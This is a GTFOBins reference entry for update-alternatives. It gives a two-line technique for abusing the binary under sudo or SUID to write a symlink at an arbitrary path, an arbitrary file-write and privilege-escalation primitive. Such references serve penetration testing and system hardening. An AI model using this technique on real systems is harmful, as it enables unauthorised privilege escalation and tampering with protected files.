<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/update-alternatives -->
---
functions:
  file-write:
  - code: |-
      echo DATA >/path/to/temp-file
      update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0
    comment: |-
      Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.
    contexts:
      sudo:
      suid:
...
